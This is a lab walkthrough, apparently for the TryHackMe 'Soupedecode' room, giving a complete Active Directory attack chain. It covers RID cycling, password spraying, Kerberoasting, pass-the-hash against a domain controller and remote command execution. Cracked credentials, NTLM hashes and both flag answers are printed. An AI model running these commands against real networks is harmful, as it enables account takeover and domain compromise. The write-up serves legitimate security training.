# 🍜 Soupedecode

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/soupedecode)
[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)](https://tryhackme.com/room/soupedecode)
[![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)](https://tryhackme.com/room/soupedecode)
[![Type](https://img.shields.io/badge/Type-Boot2Root-blue?style=for-the-badge)](https://tryhackme.com/room/soupedecode)

| | |
|---|---|
| **Target** | `10.48.134.192` |
| **OS** | Windows Server 2022 |
| **Attack Surface** | SMB, Kerberos, Active Directory |
| **Privesc** | Pass-the-Hash (machine account) |

Guest SMB auth leaks 968 domain users. A username=password spray yields a foothold. Kerberoasting cracks `file_svc:Password123!!` — credentials that unlock a backup share holding machine account NTLM hashes. PTH with `FileServer$` lands a Pwn3d! shell on the DC.

---

## 🔍 Enumeration

### Port Scan

Scan all TCP ports to find the attack surface.

```bash
rustscan -a 10.48.134.192 --ulimit 5000 --batch-size 4500 --timeout 1500
sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389 10.48.134.192
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap         SOUPEDECODE.LOCAL
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  tcpwrapped
3268/tcp  open  ldap
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server  DC01.SOUPEDECODE.LOCAL
9389/tcp  open  mc-nmf
```

Classic AD DC fingerprint. SMB signing is required, so relay attacks are off the table. No web ports — the entire attack surface is AD/SMB.

### SMB Enumeration

Check shares and auth posture without credentials.

```bash
enum4linux-ng -A 10.48.134.192
smbmap -H 10.48.134.192 -u guest -p ''
```

Guest auth works with any username and blank password. nxc shows seven shares: `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`, `Users`, and `backup`. Guest can read the `Users` share. The `backup` share is non-default and access-denied — make it a priority.

### Domain User Enumeration (RID Cycling)

Use the guest session to brute-force RIDs and extract all domain usernames.

```bash
impacket-lookupsid 'SOUPEDECODE.LOCAL/guest:@10.48.134.192' -no-pass 2>&1 | tee rid_out.txt
grep SidTypeUser rid_out.txt | grep -v '\$' | cut -d'\' -f2 | awk '{print $1}' > usernames.txt
```

lookupsid returns 968 human user accounts and 101 machine accounts (`$`). Domain SID: `S-1-5-21-2986980474-46765180-2505414164`.

---

## 💀 Initial Access

### AS-REP Roasting — Dead End

Check whether any accounts have Kerberos pre-authentication disabled.

```bash
impacket-GetNPUsers SOUPEDECODE.LOCAL/ -no-pass -usersfile usernames.txt -dc-ip 10.48.134.192
```

Zero results. All accounts require pre-auth. Move to password spray instead.

### Password Spray (Username = Password)

`--no-bruteforce` pairs each username with the password on the same line — it does not try every combination. Test whether any user set their password equal to their username.

```bash
nxc smb 10.48.134.192 -u usernames.txt -p usernames.txt --no-bruteforce --continue-on-success
```

One hit: `ybob317:ybob317`.

### User Flag

Mount the Users share with the cracked credentials and grab `user.txt`.

```bash
smbclient //10.48.134.192/Users -U 'SOUPEDECODE.LOCAL/ybob317%ybob317' \
  -c 'get ybob317\Desktop\user.txt /tmp/user.txt'
cat /tmp/user.txt
```

---

## 🔁 Privilege Escalation

### Kerberoasting

Request TGS hashes for all service accounts. Any hash cracked offline gives you that account's plaintext password.

```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.48.134.192 \
  -request -outputfile kerberoast.hashes
```

Five Kerberoastable accounts come back. All use RC4 encryption (type 23): `file_svc`, `firewall_svc`, `backup_svc`, `web_svc`, `monitoring_svc`.

Crack with hashcat against rockyou.

```bash
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt -o cracked.txt
```

One cracks: `file_svc:Password123!!`

### Backup Share Access

Mount the `backup` share, which `file_svc` can read.

```bash
smbclient //10.48.134.192/backup -U 'SOUPEDECODE.LOCAL/file_svc%Password123!!' \
  -c 'get backup_extract.txt /tmp/backup_extract.txt'
cat /tmp/backup_extract.txt
```

The file contains NTLM hashes for ten machine accounts:

| Account | NT Hash |
|---|---|
| WebServer$ | c47b45f5d4df5a494bd19f13e14f7902 |
| DatabaseServer$ | 406b424c7b483a42458bf6f545c936f7 |
| CitrixServer$ | 48fc7eca9af236d7849273990f6c5117 |
| **FileServer$** | **e41da7e79a4c76dbd9cf79d1cb325559** |
| MailServer$ | 46a4655f18def136b3bfab7b0b4e70e3 |
| BackupServer$ | 46a4655f18def136b3bfab7b0b4e70e3 |
| ApplicationServer$ | 8cd90ac6cba6dde9d8038b068c17e9f5 |
| PrintServer$ | b8a38c432ac59ed00b2a373f4f050d28 |
| ProxyServer$ | 4e3f0bb3e5b6e3e662611b1a87988881 |
| MonitoringServer$ | 48fc7eca9af236d7849273990f6c5117 |

### Pass-the-Hash — Machine Account PTH Spray

Extract the usernames and NT hashes into separate files, then PTH-spray all ten accounts.

```bash
cut -d: -f1 /tmp/backup_extract.txt > /tmp/machine_users.txt
cut -d: -f4 /tmp/backup_extract.txt > /tmp/machine_hashes.txt
nxc smb 10.48.134.192 -u /tmp/machine_users.txt -H /tmp/machine_hashes.txt \
  --no-bruteforce --continue-on-success
```

`FileServer$` returns `Pwn3d!` — full local admin on the DC.

```text
SMB  10.48.134.192  445  DC01  [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

### Root Flag

Execute a command as `FileServer$` to read the Administrator's flag directly.

```bash
nxc smb 10.48.134.192 -u 'FileServer$' -H e41da7e79a4c76dbd9cf79d1cb325559 \
  -x 'type C:\Users\Administrator\Desktop\root.txt'
```

Alternatively, open an interactive shell via wmiexec.

```bash
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559 \
  'SOUPEDECODE.LOCAL/FileServer$'@10.48.134.192
```

---

## 🗺️ Attack Chain

```
[Attacker]
    |
    | SMB guest auth → RID cycling (lookupsid)
    v
[SOUPEDECODE.LOCAL — 968 domain users enumerated]
    |
    | Password spray (username=password, --no-bruteforce)
    v
[ybob317:ybob317 — SMB read on Users share]
    |
    | Users\ybob317\Desktop\user.txt ← FLAG 1
    | Kerberoasting (GetUserSPNs) → 5 TGS hashes
    | hashcat -m 13100 → file_svc:Password123!!
    v
[file_svc — SMB read on backup share]
    |
    | backup_extract.txt → 10 machine account NTLM hashes
    v
[PTH spray (nxc --no-bruteforce)]
    |
    | FileServer$ → Pwn3d!
    v
[DC01 as FileServer$ — full local admin]
    |
    | nxc -x 'type C:\Users\Administrator\Desktop\root.txt' ← FLAG 2
    v
[DC01 PWNED]
```

---

## 📌 Key Takeaways

- **Always try guest SMB auth first.** Guest sessions often allow RID cycling, which hands you the full domain user list without any credentials.
- **Test username=password before running rockyou.** Large user lists have a high chance of at least one person using their username as their password. It's fast and costs nothing.
- **Don't ignore machine accounts.** A hash dump of machine accounts is worth PTH-spraying. They may have local admin rights the creator forgot to remove.
- **Use `--no-bruteforce` when spraying paired lists.** Without it, nxc tries every user against every password. That breaks the pairing and floods the log with wrong attempts.
- **Investigate every non-default SMB share.** The `backup` share had no obvious purpose — that's exactly why it mattered.

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Network Service Scanning | [T1046](https://attack.mitre.org/techniques/T1046) |
| Discovery | Account Discovery: Domain Account | [T1087.002](https://attack.mitre.org/techniques/T1087/002) |
| Credential Access | Password Spraying | [T1110.003](https://attack.mitre.org/techniques/T1110/003) |
| Credential Access | Steal or Forge Kerberos Tickets: Kerberoasting | [T1558.003](https://attack.mitre.org/techniques/T1558/003) |
| Credential Access | Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001) |
| Lateral Movement | Use Alternate Authentication Material: Pass-the-Hash | [T1550.002](https://attack.mitre.org/techniques/T1550/002) |
| Execution | Windows Management Instrumentation | [T1047](https://attack.mitre.org/techniques/T1047) |

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `rustscan` | Fast initial port sweep |
| `nmap` | Service and script scan |
| `enum4linux-ng` | SMB/AD enumeration via guest session |
| `smbmap` | Share permission mapping |
| `smbclient` | Share access and file retrieval |
| `impacket-lookupsid` | RID cycling to extract domain users |
| `nxc` (NetExec) | Password spray, PTH spray, command execution |
| `impacket-GetNPUsers` | AS-REP roasting |
| `impacket-GetUserSPNs` | Kerberoasting |
| `hashcat` | Offline TGS hash cracking |
| `impacket-wmiexec` | Interactive shell via WMI (Pass-the-Hash) |

---

## 🚩 Flags

<details>
<summary><code>user.txt</code></summary>

`28189316c25dd3c0ad56d44d000d62a8`

</details>

<details>
<summary><code>root.txt</code></summary>

`27cb2be302c388d63d27c86bfdd5f56a`

</details>
